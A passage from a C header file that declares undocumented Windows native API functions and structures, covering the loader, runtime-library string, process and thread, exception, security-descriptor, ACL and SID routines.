    _In_ PVOID DllHandle);

NTSTATUS NTAPI LdrEnumerateLoadedModules(
    _In_opt_ ULONG Flags,
    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,
    _In_opt_ PVOID Context);

NTSTATUS NTAPI LdrFindResource_U(
    _In_ PVOID DllHandle,
    _In_ CONST ULONG_PTR* ResourceIdPath,
    _In_ ULONG ResourceIdPathLength,
    _Out_ PIMAGE_RESOURCE_DATA_ENTRY *ResourceDataEntry);

NTSTATUS NTAPI LdrFindResourceDirectory_U(
    _In_ PVOID DllHandle,
    _In_ PLDR_RESOURCE_INFO ResourceInfo,
    _In_ ULONG Level,
    _Out_ PIMAGE_RESOURCE_DIRECTORY *ResourceDirectory);

NTSTATUS NTAPI LdrFindEntryForAddress(
    _In_ PVOID Address,
    _Out_ PLDR_DATA_TABLE_ENTRY *TableEntry);

NTSTATUS NTAPI LdrGetDllHandle(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSTATUS NTAPI LdrGetDllHandleEx(
    _In_ ULONG Flags,
    _In_opt_ PWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_opt_ PVOID *DllHandle);

NTSTATUS NTAPI LdrGetDllHandleByMapping(
    _In_ PVOID BaseAddress,
    _Out_ PVOID *DllHandle);

NTSTATUS NTAPI LdrGetDllHandleByName(
    _In_opt_ PUNICODE_STRING BaseDllName,
    _In_opt_ PUNICODE_STRING FullDllName,
    _Out_ PVOID *DllHandle);

NTSTATUS NTAPI LdrGetDllFullName(
    _In_ PVOID DllHandle,
    _Out_ PUNICODE_STRING FullDllName);

NTSTATUS NTAPI LdrGetDllDirectory(
    _Out_ PUNICODE_STRING DllDirectory);

NTSTATUS NTAPI LdrSetDllDirectory(
    _In_ PUNICODE_STRING DllDirectory);

NTSTATUS NTAPI LdrGetProcedureAddress(
    _In_ PVOID DllHandle,
    _In_opt_ CONST ANSI_STRING* ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress);

NTSTATUS NTAPI LdrGetProcedureAddressForCaller(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress,
    _In_ ULONG Flags,
    _In_ PVOID *Callback);

NTSTATUS NTAPI LdrGetKnownDllSectionHandle(
    _In_ PCWSTR DllName,
    _In_ BOOLEAN KnownDlls32,
    _Out_ PHANDLE Section);

NTSTATUS NTAPI LdrLoadDll(
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_  PCUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle);

NTSTATUS NTAPI LdrUnloadDll(
    _In_ PVOID DllHandle);

NTSTATUS NTAPI LdrQueryProcessModuleInformation(
    _Out_ PRTL_PROCESS_MODULES ModuleInformation,
    _In_ ULONG ModuleInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI LdrRegisterDllNotification(
    _In_ ULONG Flags,
    _In_ PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_opt_ PVOID Context,
    _Out_ PVOID *Cookie);

NTSTATUS NTAPI LdrUnregisterDllNotification(
    _In_ PVOID Cookie);

NTSTATUS NTAPI LdrResSearchResource(
    _In_ PVOID File,
    _In_ CONST ULONG_PTR* ResIds,
    _In_ ULONG ResIdCount,
    _In_ ULONG Flags,
    _Out_ LPVOID *Resource,
    _Out_ ULONG_PTR *Size,
    _In_opt_ USHORT *FoundLanguage,
    _In_opt_ ULONG *FoundLanguageLength);

NTSTATUS NTAPI LdrOpenImageFileOptionsKey(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ BOOLEAN Wow64Path,
    _Out_ PHANDLE KeyHandle);

NTSTATUS NTAPI LdrQueryImageFileExecutionOptions(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSTATUS NTAPI LdrQueryImageFileExecutionOptionsEx(
    _In_ PCUNICODE_STRING ImagePathName,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize,
    _In_ BOOLEAN Wow64Path);

NTSTATUS NTAPI LdrQueryImageFileKeyOption(
    _In_ HANDLE KeyHandle,
    _In_ PCWSTR OptionName,
    _In_ ULONG Type,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG ResultSize);

NTSTATUS NTAPI LdrDisableThreadCalloutsForDll(
    _In_ PVOID DllImageBase);

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS           0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY                  0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID            0x00000000
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED      0x00000001
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED  0x00000002

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS         0x00000001

NTSTATUS NTAPI LdrLockLoaderLock(
    _In_ ULONG Flags,
    _Out_opt_ ULONG *Disposition,
    _Out_ PVOID *Cookie);

NTSTATUS NTAPI LdrUnlockLoaderLock(
    _In_ ULONG Flags,
    _Inout_ PVOID Cookie);

NTSTATUS NTAPI LdrRelocateImage(
    _In_ PVOID NewBase,
    _In_ PSTR LoaderName,
    _In_ NTSTATUS Success,
    _In_ NTSTATUS Conflict,
    _In_ NTSTATUS Invalid);

PIMAGE_BASE_RELOCATION NTAPI LdrProcessRelocationBlock(
    _In_ ULONG_PTR VA,
    _In_ ULONG SizeOfBlock,
    _In_ PUSHORT NextOffset,
    _In_ LONG_PTR Diff);

NTSTATUS NTAPI LdrShutdownProcess(
    VOID);

NTSTATUS NTAPI LdrShutdownThread(
    VOID);

BOOLEAN NTAPI LdrControlFlowGuardEnforced(
    VOID);

/*
**  LDR END
*/

typedef struct _HANDLEENTRY {
    PHEAD   phead;  // Pointer to the Object.
    PVOID   pOwner; // PTI or PPI
    BYTE    bType;  // Object handle type
    BYTE    bFlags; // Flags
    WORD    wUniq;  // Access count.
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
    WORD            wRIPFlags;
    WORD            wSRVIFlags;
    WORD            wRIPPID;
    WORD            wRIPError;
    ULONG           cHandleEntries;
    // incomplete
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
    PSERVERINFO		psi;
    PHANDLEENTRY	aheList;
    ULONG			HeEntrySize;
    // incomplete
} SHAREDINFO, *PSHAREDINFO;

typedef struct _USERCONNECT {
    ULONG ulVersion;
    ULONG ulCurrentVersion;
    DWORD dwDispatchCount;
    SHAREDINFO siClient;
} USERCONNECT, *PUSERCONNECT;

/*
** Runtime Library API START
*/

/************************************************************************************
*
* CSR API.
*
************************************************************************************/

ULONG NTAPI CsrGetProcessId(
    VOID);

NTSTATUS NTAPI CsrClientConnectToServer(
    _In_ PWSTR ObjectDirectory,
    _In_ ULONG ServerDllIndex,
    _Inout_ PVOID ConnectionInformation,
    _Inout_ ULONG *ConnectionInformationLength,
    _Out_ PBOOLEAN CalledFromServer);

/************************************************************************************
*
* RTL Strings API.
*
************************************************************************************/

#ifndef RtlInitEmptyUnicodeString
#define RtlInitEmptyUnicodeString(_ucStr,_buf,_bufSize) \
    ((_ucStr)->Buffer = (_buf), \
     (_ucStr)->Length = 0, \
     (_ucStr)->MaximumLength = (USHORT)(_bufSize))
#endif

BOOLEAN NTAPI RtlCreateUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString);

BOOLEAN NTAPI RtlCreateUnicodeStringFromAsciiz(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PSTR SourceString);

VOID NTAPI RtlInitString(
    _Inout_ PSTRING DestinationString,
    _In_ PCSZ SourceString);

VOID NTAPI RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PCWSTR SourceString);

NTSTATUS NTAPI RtlInitUnicodeStringEx(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_ PWSTR SourceString);

BOOLEAN NTAPI RtlEqualUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

WCHAR NTAPI RtlUpcaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

WCHAR NTAPI RtlDowncaseUnicodeChar(
    _In_ WCHAR SourceCharacter);

BOOLEAN NTAPI RtlPrefixUnicodeString(
    _In_ PCUNICODE_STRING String1,
    _In_ PCUNICODE_STRING String2,
    _In_ BOOLEAN CaseInSensitive);

NTSTATUS NTAPI RtlExpandEnvironmentStrings(
    _In_opt_ PVOID Environment,
    _In_reads_(SrcLength) PWSTR Src,
    _In_ SIZE_T SrcLength,
    _Out_writes_opt_(DstLength) PWSTR Dst,
    _In_ SIZE_T DstLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSTATUS NTAPI RtlExpandEnvironmentStrings_U(
    _In_opt_ PVOID Environment,
    _In_ PCUNICODE_STRING Source,
    _Out_ PUNICODE_STRING Destination,
    _Out_opt_ PULONG ReturnedLength);

NTSTATUS NTAPI RtlFormatCurrentUserKeyPath(
    _Out_ PUNICODE_STRING CurrentUserKeyPath);

VOID NTAPI RtlFreeUnicodeString(
    _In_ PUNICODE_STRING UnicodeString);

VOID NTAPI RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

VOID NTAPI RtlFreeAnsiString(
    _In_ PANSI_STRING AnsiString);

NTSTATUS NTAPI RtlAnsiStringToUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_ PCANSI_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

WCHAR NTAPI RtlAnsiCharToUnicodeChar(
    _Inout_ PUCHAR *SourceCharacter);

NTSTATUS NTAPI RtlUnicodeToMultiByteSize(
    _Out_ PULONG BytesInMultiByteString,
    _In_reads_bytes_(BytesInUnicodeString) PWCH UnicodeString,
    _In_ ULONG BytesInUnicodeString);

BOOLEAN NTAPI RtlDosPathNameToNtPathName_U(
    _In_ PCWSTR DosFileName,
    _Out_ PUNICODE_STRING NtFileName,
    _Out_opt_ PWSTR *FilePart,
    _Reserved_ PVOID Reserved);

PWSTR NTAPI RtlIpv4AddressToStringW(
    _In_ const struct in_addr *Addr,
    _Out_ PWSTR S);

NTSYSAPI LONG NTAPI RtlCompareUnicodeStrings(
    _In_reads_(String1Length) PWCHAR String1,
    _In_ SIZE_T String1Length,
    _In_reads_(String2Length) PWCHAR String2,
    _In_ SIZE_T String2Length,
    _In_ BOOLEAN CaseInSensitive);

//
// preallocated heap-growable buffers
//
typedef struct _RTL_BUFFER {
    PUCHAR    Buffer;
    PUCHAR    StaticBuffer;
    SIZE_T    Size;
    SIZE_T    StaticSize;
    SIZE_T    ReservedForAllocatedSize; // for future doubling
    PVOID     ReservedForIMalloc; // for future pluggable growth
} RTL_BUFFER, *PRTL_BUFFER;

typedef struct _RTL_UNICODE_STRING_BUFFER {
    UNICODE_STRING String;
    RTL_BUFFER     ByteBuffer;
    UCHAR          MinimumStaticBufferForTerminalNul[sizeof(WCHAR)];
} RTL_UNICODE_STRING_BUFFER, *PRTL_UNICODE_STRING_BUFFER;

NTSTATUS NTAPI RtlNtPathNameToDosPathName(
    _In_ ULONG Flags,
    _Inout_ PRTL_UNICODE_STRING_BUFFER Path,
    _Out_opt_ PULONG Disposition,
    _Inout_opt_ PWSTR* FilePart);

ULONG NTAPI RtlIsDosDeviceName_U(
    _In_ PCWSTR DosFileName);

ULONG NTAPI RtlGetFullPathName_U(
    _In_ PCWSTR lpFileName,
    _In_ ULONG nBufferLength,
    _Out_writes_bytes_(nBufferLength) PWSTR lpBuffer,
    _Out_opt_ PWSTR *lpFilePart);

typedef enum _RTL_PATH_TYPE {
    RtlPathTypeUnknown,         // 0
    RtlPathTypeUncAbsolute,     // 1
    RtlPathTypeDriveAbsolute,   // 2
    RtlPathTypeDriveRelative,   // 3
    RtlPathTypeRooted,          // 4
    RtlPathTypeRelative,        // 5
    RtlPathTypeLocalDevice,     // 6
    RtlPathTypeRootLocalDevice  // 7
} RTL_PATH_TYPE;

RTL_PATH_TYPE NTAPI RtlDetermineDosPathNameType_U(
    _In_ PCWSTR DosFileName);

#define HASH_STRING_ALGORITHM_DEFAULT   (0)
#define HASH_STRING_ALGORITHM_X65599    (1)
#define HASH_STRING_ALGORITHM_INVALID   (0xffffffff)

NTSTATUS NTAPI RtlHashUnicodeString(
    _In_ const UNICODE_STRING *String,
    _In_ BOOLEAN CaseInSensitive,
    _In_ ULONG HashAlgorithm,
    _Out_ PULONG HashValue);

NTSTATUS NTAPI RtlAppendUnicodeStringToString(
    _In_ PUNICODE_STRING Destination,
    _In_ PUNICODE_STRING Source);

NTSTATUS NTAPI RtlAppendUnicodeToString(
    _In_ PUNICODE_STRING Destination,
    _In_opt_ PWSTR Source);

VOID NTAPI RtlCopyUnicodeString(
    _In_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString);

NTSTATUS NTAPI RtlUpcaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

NTSTATUS NTAPI RtlDowncaseUnicodeString(
    _Inout_ PUNICODE_STRING DestinationString,
    _In_ PUNICODE_STRING SourceString,
    _In_ BOOLEAN AllocateDestinationString);

VOID NTAPI RtlEraseUnicodeString(
    _Inout_ PUNICODE_STRING String);

/************************************************************************************
*
* RTL Process/Thread API.
*
************************************************************************************/

typedef NTSTATUS(*PUSER_PROCESS_START_ROUTINE)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
    );

typedef NTSTATUS(*PUSER_THREAD_START_ROUTINE)(
    PVOID ThreadParameter
    );

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE Process;
    HANDLE Thread;
    CLIENT_ID ClientId;
    SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

//
// This structure is used only by Wow64 processes. The offsets
// of structure elements should the same as viewed by a native Win64 application.
//
typedef struct _RTL_USER_PROCESS_INFORMATION64 {
    ULONG Length;
    LONGLONG Process;
    LONGLONG Thread;
    CLIENT_ID64 ClientId;
    SECTION_IMAGE_INFORMATION64 ImageInformation;
} RTL_USER_PROCESS_INFORMATION64, *PRTL_USER_PROCESS_INFORMATION64;

NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSTATUS STDAPIVCALLTYPE RtlSetThreadIsCritical(
    _In_ BOOLEAN NewValue,
    _Out_opt_ PBOOLEAN OldValue,
    _In_ BOOLEAN CheckFlag);

NTSTATUS NTAPI RtlCreateEnvironment(
    _In_ BOOLEAN CloneCurrentEnvironment,
    _Out_ PVOID *Environment);

NTSTATUS NTAPI RtlDestroyEnvironment(
    _In_ PVOID Environment);

NTSTATUS NTAPI RtlCreateProcessParameters(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData);

NTSTATUS NTAPI RtlDestroyProcessParameters(
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters);

NTSTATUS NTAPI RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags);

NTSTATUS NTAPI RtlCreateUserProcess(
    _In_ PUNICODE_STRING NtImagePathName,
    _In_ ULONG Attributes,
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    _In_opt_ PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_opt_ HANDLE ParentProcess,
    _In_ BOOLEAN InheritHandles,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _Out_ PRTL_USER_PROCESS_INFORMATION ProcessInformationn);

NTSTATUS NTAPI RtlCreateUserThread(
    _In_ HANDLE Process,
    _In_opt_ PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    _In_ BOOLEAN CreateSuspended,
    _In_ ULONG StackZeroBits,
    _In_opt_ SIZE_T MaximumStackSize,
    _In_opt_ SIZE_T InitialStackSize,
    _In_ PUSER_THREAD_START_ROUTINE StartAddress,
    _In_opt_ PVOID Parameter,
    _Out_opt_ PHANDLE Thread,
    _Out_opt_ PCLIENT_ID ClientId);

VOID NTAPI RtlExitUserThread(
    _In_ NTSTATUS ExitStatus);

VOID NTAPI RtlFreeUserThreadStack(
    _In_ HANDLE hProcess,
    _In_ HANDLE hThread);

VOID NTAPI RtlPushFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

VOID NTAPI RtlPopFrame(
    _In_ PTEB_ACTIVE_FRAME Frame);

PTEB_ACTIVE_FRAME NTAPI RtlGetFrame(
    VOID);

PVOID NTAPI RtlEncodePointer(
    _In_ PVOID Ptr);

PVOID NTAPI RtlDecodePointer(
    _In_ PVOID Ptr);

/************************************************************************************
*
* RTL Memory Buffer API.
*
************************************************************************************/

SIZE_T NTAPI RtlCompareMemoryUlong(
    _In_ PVOID Source,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

VOID NTAPI RtlFillMemoryUlong(
    _Out_ PVOID Destination,
    _In_ SIZE_T Length,
    _In_ ULONG Pattern);

/************************************************************************************
*
* RTL PEB API.
*
************************************************************************************/

PPEB NTAPI RtlGetCurrentPeb(
    VOID);

VOID NTAPI RtlAcquirePebLock(
    VOID);

VOID NTAPI RtlReleasePebLock(
    VOID);

/************************************************************************************
*
* RTL Exception Handling API.
*
************************************************************************************/

PVOID NTAPI RtlAddVectoredExceptionHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

ULONG NTAPI RtlRemoveVectoredExceptionHandler(
    _In_ PVOID Handle);

BOOLEAN NTAPI RtlDispatchException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord);

PVOID NTAPI RtlAddVectoredContinueHandler(
    _In_ ULONG First,
    _In_ PVECTORED_EXCEPTION_HANDLER Handler);

ULONG NTAPI RtlRemoveVectoredContinueHandler(
    _In_ PVOID Handle);

VOID NTAPI RtlRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord);

DECLSPEC_NORETURN VOID NTAPI RtlRaiseStatus(
    _In_ NTSTATUS Status);

NTSTATUS NTAPI NtContinue(
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN TestAlert);

NTSTATUS NTAPI NtRaiseException(
    _In_ PEXCEPTION_RECORD ExceptionRecord,
    _In_ PCONTEXT ContextRecord,
    _In_ BOOLEAN FirstChance);

/************************************************************************************
*
* RTL Security API.
*
************************************************************************************/

NTSTATUS NTAPI RtlGetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Owner,
    _Out_ PBOOLEAN OwnerDefaulted);

NTSTATUS NTAPI RtlGetGroupSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PSID *Group,
    _Out_ PBOOLEAN GroupDefaulted);

NTSTATUS NTAPI RtlGetDaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN DaclPresent,
    _Out_ PACL *Dacl,
    _Out_ PBOOLEAN DaclDefaulted);

NTSTATUS NTAPI RtlGetSaclSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _Out_ PBOOLEAN SaclPresent,
    _Out_ PACL *Sacl,
    _Out_ PBOOLEAN SaclDefaulted);

NTSTATUS NTAPI RtlCreateAcl(
    _Out_writes_bytes_(AclLength) PACL Acl,
    _In_ ULONG AclLength,
    _In_ ULONG AclRevision);

BOOLEAN NTAPI RtlValidAcl(
    _In_ PACL Acl);

NTSTATUS NTAPI RtlQueryInformationAcl(
    _In_ PACL Acl,
    _Out_writes_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSTATUS NTAPI RtlSetInformationAcl(
    _Inout_ PACL Acl,
    _In_reads_bytes_(AclInformationLength) PVOID AclInformation,
    _In_ ULONG AclInformationLength,
    _In_ ACL_INFORMATION_CLASS AclInformationClass);

NTSTATUS NTAPI RtlAddAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG StartingAceIndex,
    _In_reads_bytes_(AceListLength) PVOID AceList,
    _In_ ULONG AceListLength);

NTSTATUS NTAPI RtlDeleteAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceIndex);

NTSTATUS NTAPI RtlGetAce(
    _In_ PACL Acl,
    _In_ ULONG AceIndex,
    _Outptr_ PVOID *Ace);

BOOLEAN NTAPI RtlFirstFreeAce(
    _In_ PACL Acl,
    _Out_ PVOID *FirstFree);

BOOLEAN NTAPI RtlOwnerAcesPresent(
    _In_ PACL pAcl);

NTSTATUS NTAPI RtlAddAccessAllowedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAccessAllowedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAccessDeniedAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAccessDeniedAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAuditAccessAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSTATUS NTAPI RtlAddAuditAccessAceEx(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSTATUS NTAPI RtlAddAccessAllowedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAccessDeniedObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAddAuditAccessObjectAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ ACCESS_MASK AccessMask,
    _In_opt_ GUID *ObjectTypeGuid,
    _In_opt_ GUID *InheritedObjectTypeGuid,
    _In_ PSID Sid,
    _In_ BOOLEAN AuditSuccess,
    _In_ BOOLEAN AuditFailure);

NTSTATUS NTAPI RtlAddCompoundAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask,
    _In_ PSID ServerSid,
    _In_ PSID ClientSid);

NTSTATUS NTAPI RtlAddMandatoryAce(
    _Inout_ PACL Acl,
    _In_ ULONG AceRevision,
    _In_ ULONG AceFlags,
    _In_ PSID Sid,
    _In_ UCHAR AceType,
    _In_ ACCESS_MASK AccessMask);

NTSTATUS NTAPI RtlDefaultNpAcl(
    _Out_ PACL *Acl);

ULONG NTAPI RtlLengthSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

VOID NTAPI RtlMapGenericMask(
    _In_ PACCESS_MASK AccessMask,
    _In_ PGENERIC_MAPPING GenericMapping);

BOOLEAN NTAPI RtlValidSid(
    _In_ PSID Sid);

BOOLEAN NTAPI RtlEqualSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

BOOLEAN NTAPI RtlEqualPrefixSid(
    _In_ PSID Sid1,
    _In_ PSID Sid2);

ULONG NTAPI RtlLengthRequiredSid(
    _In_ ULONG SubAuthorityCount);

PVOID NTAPI RtlFreeSid(
    _In_ PSID Sid);

NTSTATUS NTAPI RtlAllocateAndInitializeSid(
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount,
    _In_ ULONG SubAuthority0,
    _In_ ULONG SubAuthority1,
    _In_ ULONG SubAuthority2,
    _In_ ULONG SubAuthority3,
    _In_ ULONG SubAuthority4,
    _In_ ULONG SubAuthority5,
    _In_ ULONG SubAuthority6,
    _In_ ULONG SubAuthority7,
    _Out_ PSID *Sid);

NTSTATUS NTAPI RtlInitializeSid(
    _Out_ PSID Sid,
    _In_ PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    _In_ UCHAR SubAuthorityCount);

PSID_IDENTIFIER_AUTHORITY NTAPI RtlIdentifierAuthoritySid(
    _In_ PSID Sid);

PULONG NTAPI RtlSubAuthoritySid(
    _In_ PSID Sid,
    _In_ ULONG SubAuthority);

PUCHAR NTAPI RtlSubAuthorityCountSid(
    _In_ PSID Sid);

ULONG NTAPI RtlLengthSid(
    _In_ PSID Sid);

NTSTATUS NTAPI RtlCopySid(
    _In_ ULONG DestinationSidLength,
    _In_ PSID DestinationSid,
    _In_ PSID SourceSid);

NTSTATUS NTAPI RtlCopySidAndAttributesArray(
    _In_ ULONG ArrayLength,
    _In_ PSID_AND_ATTRIBUTES Source,
    _In_ ULONG TargetSidBufferSize,
    _Out_ PSID_AND_ATTRIBUTES TargetArrayElement,
    _Out_ PSID TargetSid,
    _Out_ PSID *NextTargetSid,
    _Out_ PULONG RemainingTargetSidBufferSize);

NTSTATUS NTAPI RtlLengthSidAsUnicodeString(
    _In_ PSID Sid,
    _Out_ PULONG StringLength);

NTSTATUS NTAPI RtlConvertSidToUnicodeString(
    _In_ PUNICODE_STRING UnicodeString,
    _In_ PSID Sid,
    _In_ BOOLEAN AllocateDestinationString);

NTSTATUS NTAPI RtlCreateSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Revision);

NTSTATUS NTAPI RtlSetOwnerSecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ PSID Owner,
    _In_ BOOLEAN OwnerDefaulted);

NTSTATUS NTAPI RtlCopySecurityDescriptor(
    _In_ PSECURITY_DESCRIPTOR InputSecurityDescriptor,
    _Out_ PSECURITY_DESCRIPTOR *OutputSecurityDescriptor);

FORCEINLINE LUID NTAPI RtlConvertLongToLuid(
    _In_ LONG Long
)
{
    LUID TempLuid;
    LARGE_INTEGER TempLi;

    TempLi.QuadPart = Long;
    TempLuid.LowPart = TempLi.LowPart;
    TempLuid.HighPart = TempLi.HighPart;
    return(TempLuid);
}

ULONG NTAPI RtlRandomEx(
    _Inout_ PULONG Seed);

ULONG32 NTAPI RtlComputeCrc32(
    _In_ ULONG32 PartialCrc,
    _In_ PVOID Buffer,
    _In_ ULONG Length);

NTSTATUS NTAPI RtlAdjustPrivilege(
    _In_ ULONG Privilege,
    _In_ BOOLEAN Enable,
    _In_ BOOLEAN Client,
    _Out_ PBOOLEAN WasEnabled);

/************************************************************************************
*
* RTL Version API.
*
************************************************************************************/

NTSTATUS NTAPI RtlGetVersion(
    _Inout_	PRTL_OSVERSIONINFOW lpVersionInformation);

VOID NTAPI RtlGetNtVersionNumbers(
    _Out_opt_ PULONG MajorVersion,
    _Out_opt_ PULONG MinorVersion,
    _Out_opt_ PULONG BuildNumber);

/************************************************************************************
*
* RTL Error Status API.
*
************************************************************************************/

ULONG NTAPI RtlNtStatusToDosError(
    _In_ NTSTATUS Status);

